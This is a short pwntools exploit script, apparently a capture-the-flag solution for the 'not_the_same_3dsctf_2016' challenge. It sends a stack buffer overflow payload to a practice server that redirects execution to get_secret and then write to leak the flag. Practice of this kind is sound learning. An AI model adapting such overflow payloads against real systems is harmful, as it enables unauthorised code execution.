import secrets
from pwn import *
from LibcSearcher import *

p = remote("node4.buuoj.cn",25721)
#p = process('./')
context.log_level = "debug"
elf = ELF('./not_the_same_3dsctf_2016')

flag_addr = 0x80ECA2D
get_secret = 0x80489A0

payload = b'a'*45 + p32(get_secret) + p32(elf.symbols['write']) + p32(flag_addr) + p32(1) + p32(flag_addr) + p32(42)
#p.recv()
p.sendline(payload)

p.interactive()
